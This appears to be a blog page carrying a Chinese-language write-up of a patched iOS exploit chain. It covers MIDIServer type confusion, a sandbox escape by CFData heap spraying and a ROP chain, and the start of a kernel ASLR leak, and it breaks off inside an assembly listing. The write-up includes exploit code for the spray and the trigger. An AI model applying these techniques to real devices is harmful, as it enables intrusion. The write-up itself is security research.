<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="buffer0verflooow - Blog">
<meta property="og:url" content="https://buffer0verflooow.github.io/page/47/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="buffer0verflooow">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://buffer0verflooow.github.io/page/47/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/47/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">buffer0verflooow - Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/12/iOS-RCE-CVE-2019-8797-CVE-2019-8795-CVE-2019-8794/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/12/iOS-RCE-CVE-2019-8797-CVE-2019-8795-CVE-2019-8794/" class="post-title-link" itemprop="url">iOS RCE: CVE-2019-8797,CVE-2019-8795,CVE-2019-8794</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-12 18:36:57" itemprop="dateCreated datePublished" datetime="2021-12-12T18:36:57+08:00">2021-12-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-03 21:26:13" itemprop="dateModified" datetime="2022-05-03T21:26:13+08:00">2022-05-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这三个漏洞是在iOS12.3.1中发现的，将这些漏洞进行组合，能够实现在内核中执行代码。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>在iOS 13.2，iPadOS 13.2，macOS Catalina 10.15.1，tvOS 13.2，watchOS 6.1中进行了修复。</p>
<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>与内核相反，许多在用户空间中运行的守护进程可以通过默认的应用程序沙箱访问。<code>MIDIServer(com.apple.midiserver)</code>允许应用程序和其他服务与可能连接到设备的MIDI硬件进行交互。</p>
<p><code>MIDIServer</code>二进制文件本身相当简单，它是一个 stub 二进制文件，它的所有功能实际上都存储在一个库中，该库是共享缓存<code>(CoreMIDI)</code>的一部分：<code>MIDIServer</code>的<code>main</code>函数只是调用<code>MIDIServerRun()</code>函数。</p>
<p><code>CoreMIDI</code>然后设置两个沙箱可访问的Mach服务，<a target="_blank" rel="noopener" href="http://com.apple.midiserver和com.apple.midiserver.io/"><code>com.apple.midiserver和com.apple.midiserver.io</code></a>。前者是典型的基于MIG的Mach服务器，它实现了47种方法。然而<code>com.apple.midiserver.io</code>是一个自定义实现，用于在客户端和服务器之间传输IO缓冲区。</p>
<p><code>IO Mach server</code>主线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">MIDIIOThread::Run</span><span class="params">(MIDIIOThread *this, __int64 a2, __int64 a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  x0 = XMachServer::CreateServerPort(<span class="string">&quot;com.apple.midiserver.io&quot;</span>, <span class="number">3</span>, this + <span class="number">140</span>, a4);</span><br><span class="line">  *(this + <span class="number">36</span>) = x0;</span><br><span class="line">  <span class="keyword">if</span> ( !*(this + <span class="number">35</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    server_port = x0;</span><br><span class="line">    *(this + <span class="number">137</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      bufsz = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( XServerMachPort::ReceiveMessage(&amp;server_port, &amp;msg_cmd, &amp;msg_buf, &amp;bufsz) || msg_cmd == <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef(&amp;v10, msg_buf);</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( msg_cmd == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ClientProcess::WriteDataAvailable(v12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( msg_cmd == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ClientProcess::EmptiedReadBuffer(v12);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        applesauce::experimental::sync::LockFreeHashTable&lt;<span class="type">unsigned</span> <span class="type">int</span>,BaseOpaqueObject *,(applesauce::experimental::sync::LockFreeHashTableOptions)<span class="number">1</span>&gt;::Lookup::~Lookup(&amp;v11);</span><br><span class="line">        LOBYTE(v10) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    x0 = XServerMachPort::~XServerMachPort(&amp;server_port);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>XServerMachPort::ReceiveMessage</code>使用<code>MACH_RCV_MSG</code>参数调用<code>mach_msg</code>，等待该端口上的消息。这个消息包含一个命令ID和一个长度字段，后面是消息的主体，由<code>ReceiveMessage</code>调用解析。提供了三个命令：命令1将调用<code>ClientProcess::WriteDataAvailable</code>，命令2将调用<code>ClientProcess::EmptiedReadBuffer</code>，命令3将退出Mach服务循环。通过<code>ResolvedOpaqueRef</code>找到传递给<code>ClientProcess</code>调用的v12对象。这个方法将使用消息中提供的4字节缓冲区(对象ID)在哈希表中查找，将对象返回到堆栈上。</p>
<p>这漏洞存在于<code>ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef</code>函数中。</p>
<p>这个方法使用的哈希表实际上包含许多不同类型的对象，而不仅仅是<code>ClientProcess</code>类型的对象。例如，<code>MIDIExternalDeviceCreate</code>和<code>MIDIDeviceAddEntity</code>创建的对象都存储在此哈希表中。</p>
<p>如果进行正确的类型检查，这里就没有问题。但是，实际上，有两种访问此哈希表的方法：</p>
<ol>
<li><code>BaseOpaqueObject::ResolveOpaqueRef</code></li>
<li><code>ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef</code></li>
</ol>
<p>第一种在<code>_MIDIDeviceAddEntity</code>方法中使用，包含正确的类型检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midi_device = BaseOpaqueObject::ResolveOpaqueRef(&amp;TOpaqueRTTI&lt;MIDIDevice&gt;::sRTTI, device_id);</span><br></pre></td></tr></table></figure>

<p>但是，第二种没有。这意味着，通过不同类型对象的 ID，可以在其中一个<code>ClientProcess</code>调用中导致类型混淆，而该方法需要<code>ClientProcess*</code>类型的对象。</p>
<p>查看<code>EmptiedReadBuffer</code>的调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; __int64 MIDIIOThread::Run(MIDIIOThread *this)</span><br><span class="line">__ZN12MIDIIOThread3RunEv</span><br><span class="line">[...]</span><br><span class="line">BL              __ZN13ClientProcess17EmptiedReadBufferEv ; ClientProcess::EmptiedReadBuffer(x0) // `x0` is potentially type confused</span><br><span class="line"></span><br><span class="line">; __int64 ClientProcess::EmptiedReadBuffer(ClientProcess *this)</span><br><span class="line">__ZN13ClientProcess17EmptiedReadBufferEv</span><br><span class="line">                STP             X20, X19, [SP,#-0x10+var_10]!</span><br><span class="line">                STP             X29, X30, [SP,#0x10+var_s0]</span><br><span class="line">                ADD             X29, SP, #0x10</span><br><span class="line">                MOV             X19, X0</span><br><span class="line">                ADD             X0, X0, #0x20 ; this</span><br><span class="line">                BL              __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv ; MIDIIORingBufferWriter::EmptySecondaryQueue(x0)</span><br><span class="line"></span><br><span class="line">; bool MIDIIORingBufferWriter::EmptySecondaryQueue(MIDIIORingBufferWriter *this)</span><br><span class="line">__ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv</span><br><span class="line"></span><br><span class="line">                STP             X28, X27, [SP,#-0x10+var_50]!</span><br><span class="line">                STP             X26, X25, [SP,#0x50+var_40]</span><br><span class="line">                STP             X24, X23, [SP,#0x50+var_30]</span><br><span class="line">                STP             X22, X21, [SP,#0x50+var_20]</span><br><span class="line">                STP             X20, X19, [SP,#0x50+var_10]</span><br><span class="line">                STP             X29, X30, [SP,#0x50+var_s0]</span><br><span class="line">                ADD             X29, SP, #0x50</span><br><span class="line">                MOV             X21, X0</span><br><span class="line">                MOV             X19, X0 ; x19 = (MIDIIORingBufferWritter *)this</span><br><span class="line">                LDR             X8, [X19,#0x58]!</span><br><span class="line">                LDR             X8, [X8,#0x10]</span><br><span class="line">                MOV             X0, X19</span><br></pre></td></tr></table></figure>

<p>如上所见，<code>EmptiedReadBuffer</code>代码将立即解除类型混淆对象中的两个指针的引用，并将其转移到一个可以被攻击者控制的地址，这个调用看起来是这样：<code>obj→0x78→0x10(obj→0x20)</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了利用这个漏洞，我们可以将<code>ClientProcess</code>类型与<code>MIDIEntity</code>实例混淆。<code>MIDIEntity</code>的大小为<code>0x78</code>，这表示着对象执行的第一次取消引用将超出内存范围。然后，可以在<code>MIDIEntity</code>对象之后对一些受控制的数据进行对齐，因为我们处于用户态，所以有更好的方法。</p>
<p><code>MIDIObjectSetDataProperty</code> API调用将把<code>CoreFoundation</code>对象反序列化到<code>MIDIServer</code>的堆中，因此使用这个调用可以喷射大小为<code>0x90</code>的<code>CFData</code>对象。然后利用此漏洞发送两个包含OOL内存描述符的Mach消息，将其映射到静态地址<code>0x29f000000</code>(由于某些原因，需要发送两次该消息，否则将不会立即映射内存，尚不确定原因)，这个内存是一个连续的CoW映射，包含稍后要使用的ROP链，而且重要的是一个位于<code>0x10</code>偏移处的函数指针，将被<code>EmptySecondaryQueue</code>取消引用。</p>
<p>下面的代码将设置<code>CFData</code>对象被加入<code>MIDIServer</code>的堆中：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Prepare_bunch_keys(); <span class="comment">// For iterating</span></span><br><span class="line">  size_t spraybufsize = <span class="number">0x90</span>;</span><br><span class="line">  <span class="type">void</span> *spraybuf = malloc(spraybufsize);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;spraybufsize; i+=<span class="number">0x8</span>)&#123;</span><br><span class="line">      *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS; <span class="comment">// The 0x29f000000 address</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">CFDataRef</span> spraydata = <span class="built_in">CFDataCreate</span>(kCFAllocatorDefault, spraybuf, spraybufsize);</span><br></pre></td></tr></table></figure>

<p>堆的构造：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OSStatus MIDIClientCreate(CFStringRef name, MIDINotifyProc notifyProc, void *notifyRefCon, MIDIClientRef *outClient);</span></span><br><span class="line">uint32_t mclient_id = <span class="number">0</span>;</span><br><span class="line">MIDIClientCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), useless_notify, <span class="literal">NULL</span>, &amp;mclient_id);</span><br><span class="line">printf(<span class="string">&quot;MIDI Client ID: 0x%xn&quot;</span>, mclient_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);</span></span><br><span class="line">uint32_t mdevice_id = <span class="number">0</span>;</span><br><span class="line">MIDIExternalDeviceCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), &amp;mdevice_id);</span><br><span class="line">printf(<span class="string">&quot;MIDI Device ID: 0x%xn&quot;</span>, mdevice_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIObjectSetDataProperty(MIDIObjectRef obj, CFStringRef propertyID, CFDataRef data);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata); <span class="comment">// Each call will unserialize one CFData object of size 0x90 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sends 1 OOL descriptor each with the spray memory mapping </span></span><br><span class="line">Send_spray_mem();</span><br><span class="line">Send_spray_mem();</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIObjectRemoveProperty(MIDIObjectRef obj, CFStringRef propertyID);</span></span><br><span class="line"><span class="comment">// Removes every other property we just added</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i = i + <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]); <span class="comment">// Free&#x27;s the CFData object, popping holes on the heap </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们现在分配了<code>150</code>个<code>CFData</code>和<code>150</code>个大小为<code>0x90</code>的空闲空间，全部包含<code>SPRAY_ADDRESS</code>指针。下一步是使用<code>MIDIEntity</code>对象填充其中一个漏洞：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32_t mentity_id = <span class="number">0</span>;</span><br><span class="line">MIDIDeviceAddEntity(mdevice_id, <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;mentity_id);</span><br><span class="line">printf(<span class="string">&quot;mentity_id = 0x%xn&quot;</span>, mentity_id);</span><br></pre></td></tr></table></figure>

<p>如果一切按计划进行，那么现在应该在堆上有一块内存，其中第一个<code>0x78</code>字节用有效的<code>MIDIEntity</code>对象填充，剩下的<code>0x18</code>字节用<code>SPRAY_ADDRESS</code>指针填充。</p>
<p>为了触发这个漏洞，我们可以使用<code>MIDIEntity</code>对象<code>ID(mentity_id)</code><a target="_blank" rel="noopener" href="http://调用com.apple.midiserver.io/">调用<code>com.apple.midiserver.io</code></a> Mach服务：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sends msgh_id 0 with cmd 2 and datalen 4 (ClientProcess::EmptiedReadBuffer)</span></span><br><span class="line">Init_triggerExp_msg(mentity_id);</span><br><span class="line">Send_triggerExp_msg();</span><br></pre></td></tr></table></figure>

<p>它将启动<code>MIDIServer</code>进程中Mach服务线程上的ROP链。</p>
<p>然后根据新对象的ID判断是否触发漏洞：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);</span></span><br><span class="line">uint32_t verifysucc_mdevice_id = <span class="number">0</span>;</span><br><span class="line">MIDIExternalDeviceCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), &amp;verifysucc_mdevice_id);</span><br><span class="line">printf(<span class="string">&quot;verify_mdevice_id: 0x%xn&quot;</span>, verifysucc_mdevice_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (verifysucc_mdevice_id == mdevice_id + <span class="number">2</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We failed, reattempting...</span></span><br><span class="line">printf(<span class="string">&quot;Try againn&quot;</span>);</span><br><span class="line">MIDIRestart();</span><br></pre></td></tr></table></figure>

<p>如果对象不连续，则表示利用失败(守护进程崩溃)，因此可以通过<code>MIDIRestart</code>调用重新启动守护进程，然后可以重新尝试利用漏洞。</p>
<p>这里ROP链的基本思路是在<code>SPRAY_ADDRESS</code>内存映射中的缓冲区上调用<code>objc_release</code>，在这个地址上伪造一个假的<code>Objective-C</code>对象，在这个对象上执行release方法。然后创建一个原始的调用链，目的是打开3个<code>userclients</code>，并挂在<code>mach_msg_receive</code>调用中，以便稍后在收到消息时通过<code>vm_read_overwrite</code>覆盖一些内存，这将在稍后的内核利用中使用。</p>
<p>需要注意的是，对于这种基于ROP的利用方法，A12和更新的处理器需要绕过PAC。</p>
<p>从<code>MIDIServer</code>获取的<code>userclients</code>是<code>AppleSPUProfileDriver</code>、<code>IOSurfaceRoot</code>和<code>AppleAVE2Driver</code>。</p>
<h3 id="使用AppleSPUProfileDriver-攻破内核ASLR"><a href="#使用AppleSPUProfileDriver-攻破内核ASLR" class="headerlink" title="使用AppleSPUProfileDriver:攻破内核ASLR"></a>使用AppleSPUProfileDriver:攻破内核ASLR</h3><p>通过<code>MIDIServer</code>我们可以访问<code>AppleSPUProfileDriver</code> <code>userclient</code>，这个<code>userclient</code>实现了12个方法，但是我们只对<code>AppleSPUProfileDriverUserClient::extSignalBreak</code>感兴趣。查看伪代码：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 dataQueueLock; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// x0</span></span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [xsp+8h] [xbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [xsp+Ch] [xbp-44h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [xsp+10h] [xbp-40h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+38h] [xbp-18h]</span></span><br><span class="line"></span><br><span class="line">  dataQueueLock = <span class="variable language_">this</span>-&gt;dataQueueLock;</span><br><span class="line">  IORecursiveLockLock(<span class="variable language_">this</span>-&gt;dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="variable language_">this</span>-&gt;dataQueue )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    abs_time = mach_absolute_time();</span><br><span class="line">    v12 = AppleSPUProfileDriver::absolutetime_to_sputime(<span class="variable language_">this</span>, abs_time);</span><br><span class="line">    v11 = OSIncrementAtomic(&amp;<span class="variable language_">this</span>-&gt;atomicCount);</span><br><span class="line">    (*(*<span class="variable language_">this</span>-&gt;dataQueue + <span class="number">0x88</span>âˆ‚LL))();           <span class="comment">// IOSharedDataQueue::enqueue(&amp;v10, 0x30)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  result = IORecursiveLockUnlock(dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数通过一个锁，将一些数据写入堆栈上存储的缓冲区，并调用<code>IOSharedDataQueue::enqueue</code>将该数据提交到对立，缓冲区大小为<code>0x30</code>。这里访问堆栈的方式不是很清楚，所以看一下汇编代码：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">; __int64 